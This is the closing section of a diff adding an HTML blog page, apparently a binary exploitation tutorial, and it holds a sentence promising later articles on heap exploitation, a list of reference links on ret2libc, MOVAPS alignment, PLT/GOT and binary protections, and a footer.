+<p>In upcoming articles, we will delve into heap exploitation, which involves more advanced concepts.</p><br/>
+<h3>References</h3><br/>
+<p><a href="https://www.felixcloutier.com/x86/movaps">https://www.felixcloutier.com/x86/movaps</a>
+<br/>
+<a href="https://stackoverflow.com/questions/75104277/ret2libc-attack-movaps-segfault">https://stackoverflow.com/questions/75104277/ret2libc-attack-movaps-segfault</a>
+<br/>
+<a href="https://elswix.github.io/articles/10/64-bit-vs-32-bit.html">https://elswix.github.io/articles/10/64-bit-vs-32-bit.html</a>
+<br/>
+<a href="https://elswix.github.io/articles/8/return-2-libc.html">https://elswix.github.io/articles/8/return-2-libc.html</a>
+<br/>
+<a href="https://elswix.github.io/articles/6/PLT-and-GOT.html">https://elswix.github.io/articles/6/PLT-and-GOT.html</a>
+<br/>
+<a href="https://elswix.github.io/articles/4/binary-protections.html">https://elswix.github.io/articles/4/binary-protections.html</a>
+<br/>
+<a href="https://elswix.github.io/articles/3/cpu-and-assembly-binexp-basics.html">https://elswix.github.io/articles/3/cpu-and-assembly-binexp-basics.html</a>
+<br/>
+<a href="https://elswix.github.io/articles/2/assembly-instructions-intel-x86.html">https://elswix.github.io/articles/2/assembly-instructions-intel-x86.html</a></p><br/>
+<p><br/></p><br/>
+<p><a href="https://elswix.github.io/articles/understanding-linux-user-ids.html">https://elswix.github.io/articles/understanding-linux-user-ids.html</a>
+<br/></p><br/>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2024 elswix.github.io</p>
+    </footer>
+</body>
+</html>
